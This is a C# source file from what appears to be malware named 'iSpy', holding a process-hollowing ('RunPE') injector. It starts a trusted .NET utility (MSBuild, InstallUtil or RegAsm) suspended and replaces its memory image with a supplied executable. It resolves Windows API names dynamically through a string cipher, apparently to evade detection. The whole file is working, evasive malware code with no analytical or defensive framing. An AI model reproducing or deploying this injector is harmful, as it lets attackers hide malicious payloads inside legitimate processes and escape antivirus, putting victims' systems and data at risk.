using System;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security;
using System.Reflection;

namespace iSpy
{
    public class MemoryInjection
    {
        #region " WinAPI "

        [SuppressUnmanagedCodeSecurity, DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        private static extern bool CreateProcess(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref STARTUP_INFORMATION startupInfo, ref PROCESS_INFORMATION processInformation);

        //[SuppressUnmanagedCodeSecurity, DllImport("kernel32.dll")]
        //private static extern bool GetThreadContext(IntPtr thread, int[] context);

        //[SuppressUnmanagedCodeSecurity, DllImport("ntdll.dll")]
        //private static extern int NtUnmapViewOfSection(IntPtr process, int baseAddress);

        //[SuppressUnmanagedCodeSecurity, DllImport("kernel32.dll")]
        //private static extern bool ReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);

        //[SuppressUnmanagedCodeSecurity, DllImport("kernel32.dll")]
        //private static extern int ResumeThread(IntPtr handle);

        //[SuppressUnmanagedCodeSecurity, DllImport("kernel32.dll")]
        //private static extern bool SetThreadContext(IntPtr thread, int[] context);

        //[SuppressUnmanagedCodeSecurity, DllImport("kernel32.dll")]
        //private static extern int VirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);

        //[SuppressUnmanagedCodeSecurity, DllImport("kernel32.dll")]
        //private static extern bool Wow64GetThreadContext(IntPtr thread, int[] context);

        //[SuppressUnmanagedCodeSecurity, DllImport("kernel32.dll")]
        //private static extern bool Wow64SetThreadContext(IntPtr thread, int[] context);

        //[SuppressUnmanagedCodeSecurity, DllImport("kernel32.dll")]
        //private static extern bool WriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);

        #endregion

        //private delegate bool CreateProcess(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref STARTUP_INFORMATION startupInfo, ref PROCESS_INFORMATION processInformation);
        //private static CreateProcess DynamicCreateProcess;

        private delegate bool GetThreadContext(IntPtr thread, int[] context);
        private static GetThreadContext DynamicGetThreadContext;

        private delegate int NtUnmapViewOfSection(IntPtr process, int baseAddress);
        private static NtUnmapViewOfSection DynamicNtUnmapViewOfSection;

        private delegate bool ReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);
        private static ReadProcessMemory DynamicReadProcessMemory;

        private delegate int ResumeThread(IntPtr handle);
        private static ResumeThread DynamicResumeThread;


        private delegate bool SetThreadContext(IntPtr thread, int[] context);
        private static SetThreadContext DynamicSetThreadContext;

        private delegate int VirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);
        private static VirtualAllocEx DynamicVirtualAllocEx;

        private delegate bool Wow64GetThreadContext(IntPtr thread, int[] context);
        private static Wow64GetThreadContext DynamicWow64GetThreadContext;

        private delegate bool Wow64SetThreadContext(IntPtr thread, int[] context);
        private static Wow64SetThreadContext DynamicWow64SetThreadContext;

        private delegate bool WriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
        private static WriteProcessMemory DynamicWriteProcessMemory;

        public static void Initialize()
        {
            //DynamicCreateProcess = Core.CreateAPI<CreateProcess>(Core.KERNEL32, StringCipher.Decrypt("[CreateProcessW]", Config.MUTEX));
            DynamicGetThreadContext = Core.CreateAPI<GetThreadContext>(Core.KERNEL32, StringCipher.Decrypt("[GetThreadContext]", Config.MUTEX));
            DynamicNtUnmapViewOfSection = Core.CreateAPI<NtUnmapViewOfSection>("ntdll", StringCipher.Decrypt("[NtUnmapViewOfSection]", Config.MUTEX));
            DynamicReadProcessMemory = Core.CreateAPI<ReadProcessMemory>(Core.KERNEL32, StringCipher.Decrypt("[ReadProcessMemory]", Config.MUTEX));
            DynamicResumeThread = Core.CreateAPI<ResumeThread>(Core.KERNEL32, StringCipher.Decrypt("[ResumeThread]", Config.MUTEX));
            DynamicSetThreadContext = Core.CreateAPI<SetThreadContext>(Core.KERNEL32, StringCipher.Decrypt("[SetThreadContext]", Config.MUTEX));
            DynamicVirtualAllocEx = Core.CreateAPI<VirtualAllocEx>(Core.KERNEL32, StringCipher.Decrypt("[VirtualAllocEx]", Config.MUTEX));
            DynamicWow64GetThreadContext = Core.CreateAPI<Wow64GetThreadContext>(Core.KERNEL32, StringCipher.Decrypt("[Wow64GetThreadContext]", Config.MUTEX));
            DynamicWow64SetThreadContext = Core.CreateAPI<Wow64SetThreadContext>(Core.KERNEL32, StringCipher.Decrypt("[Wow64SetThreadContext]", Config.MUTEX));
            DynamicWriteProcessMemory = Core.CreateAPI<WriteProcessMemory>(Core.KERNEL32, StringCipher.Decrypt("[WriteProcessMemory]", Config.MUTEX));



        }

        public static void InjectPE(byte[] pe, string injectionPath, string[] parameters)
        {
            try
            {
                Initialize();
                string parameter = string.Empty;
                if (parameters.Length > 0)
                {
                    for (int i = 0; i < parameters.Length; i++)
                        parameter = parameters[i] + " ";
                    parameter.TrimEnd();
                }
                if (string.IsNullOrEmpty(injectionPath))
                    injectionPath = GetDynamicInjectionPath(GetInjectionFramework(pe));
                bool compatible = Run(pe, parameter, injectionPath, true);
                if (!compatible)
                    Run(pe, parameter, injectionPath, false);
            }
            catch (Exception ex) { Config.DumpErrorLog(ex, null); }
        }

       
        private static string GetInjectionFramework(byte[] assembly)
        {
            try { return Assembly.ReflectionOnlyLoad(assembly).ImageRuntimeVersion; }
            catch (Exception) { return "v2.0.50727"; }
        }
        private static string GetDynamicInjectionPath(string framework)
        {
            Random random = new Random();
            string[] files = {"MSBuild", "InstallUtil", "RegAsm"};
            string path = Environment.GetEnvironmentVariable("windir") + "\\Microsoft.NET\\Framework\\" + framework  + "\\" + files[random.Next(0, files.Length)] + ".exe";
            return path;
        }
        private static bool HandleRun(byte[] data, string args, string injectionPath, bool compatible)
        {
            string commandLine = string.Format("\"{0}\"", injectionPath);
            STARTUP_INFORMATION startupInfo = new STARTUP_INFORMATION();
            PROCESS_INFORMATION processInformation = new PROCESS_INFORMATION();
            startupInfo.Size = (uint)Marshal.SizeOf(typeof(STARTUP_INFORMATION));
            try
            {
                int num = 0;
                bool flag2 = false;
                int num3 = 0;
                if (!string.IsNullOrEmpty(args))
                {
                    commandLine = commandLine + " " + args;
                }
                if (!CreateProcess(injectionPath, commandLine, IntPtr.Zero, IntPtr.Zero, false, 4, IntPtr.Zero, null, ref startupInfo, ref processInformation))
                {
                    throw new Exception();
                }
                int num5 = BitConverter.ToInt32(data, 60);
                int address = BitConverter.ToInt32(data, num5 + 0x34);
                int[] context = new int[0xb3];
                context[0] = 0x10002;
                if (IntPtr.Size == 4)
                {
                    if (!DynamicGetThreadContext(processInformation.ThreadHandle, context))
                    {
                        throw new Exception();
                    }
                }
                else if (!DynamicWow64GetThreadContext(processInformation.ThreadHandle, context))
                {
                    throw new Exception();
                }
                int num4 = context[0x29];
                if (!DynamicReadProcessMemory(processInformation.ProcessHandle, num4 + 8, ref num3, 4, ref num))
                {
                    throw new Exception();
                }
                if ((address == num3) && (DynamicNtUnmapViewOfSection(processInformation.ProcessHandle, num3) != 0))
                {
                    throw new Exception();
                }
                int length = BitConverter.ToInt32(data, num5 + 80);
                int bufferSize = BitConverter.ToInt32(data, num5 + 0x54);
                int baseAddress = DynamicVirtualAllocEx(processInformation.ProcessHandle, address, length, 0x3000, 0x40);
                if (!compatible && (baseAddress == 0))
                {
                    flag2 = true;
                    baseAddress = DynamicVirtualAllocEx(processInformation.ProcessHandle, 0, length, 0x3000, 0x40);
                }
                if (baseAddress == 0)
                {
                    throw new Exception();
                }
                if (!DynamicWriteProcessMemory(processInformation.ProcessHandle, baseAddress, data, bufferSize, ref num))
                {
                    throw new Exception();
                }
                int num9 = num5 + 0xf8;
                short num8 = BitConverter.ToInt16(data, num5 + 6);
                for (int i = 0; i <= num8 - 1; i++)
                {
                    int srcOffset = BitConverter.ToInt32(data, num9 + 20);
                    if (BitConverter.ToInt32(data, num9 + 0x10) != 0)
                    {
                        byte[] dst = new byte[BitConverter.ToInt32(data, num9 + 0x10)];
                        Buffer.BlockCopy(data, srcOffset, dst, 0, dst.Length);
                        if (!DynamicWriteProcessMemory(processInformation.ProcessHandle, baseAddress + BitConverter.ToInt32(data, num9 + 12), dst, dst.Length, ref num))
                        {
                            throw new Exception();
                        }
                    }
                    num9 += 40;
                }
                byte[] bytes = BitConverter.GetBytes(baseAddress);
                if (!DynamicWriteProcessMemory(processInformation.ProcessHandle, num4 + 8, bytes, 4, ref num))
                {
                    throw new Exception();
                }
                int num2 = BitConverter.ToInt32(data, num5 + 40);
                if (flag2)
                {
                    baseAddress = address;
                }
                context[0x2c] = baseAddress + num2;
                if (IntPtr.Size == 4)
                {
                    if (!DynamicSetThreadContext(processInformation.ThreadHandle, context))
                    {
                        throw new Exception();
                    }
                }
                else if (!DynamicWow64SetThreadContext(processInformation.ThreadHandle, context))
                {
                    throw new Exception();
                }
                if (DynamicResumeThread(processInformation.ThreadHandle) == -1)
                {
                    throw new Exception();
                }
            }
            catch
            {
                Process processById = Process.GetProcessById((int) processInformation.ProcessId);
                if (processById != null)
                {
                    processById.Kill();
                }
                bool flag = false;
                return flag;
            }
            return true;
        }

        private static bool Run(byte[] data, string args, string injectionPath, bool compatible)
        {
            int num2 = 5;
            int num = 1;
            do
            {
                if (HandleRun(data, args, injectionPath, compatible))
                {
                    return true;
                }
                num++;
            }
            while (num <= num2);
            return false;
        }

        [StructLayout(LayoutKind.Sequential, Pack=1)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr ProcessHandle;
            public IntPtr ThreadHandle;
            public uint ProcessId;
            public uint ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, Pack=1)]
        private struct STARTUP_INFORMATION
        {
            public uint Size;
            public string Reserved1;
            public string Desktop;
            public string Title;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst=0x24)]
            public byte[] Misc;
            public IntPtr Reserved2;
            public IntPtr StdInput;
            public IntPtr StdOutput;
            public IntPtr StdError;
        }
    }
}

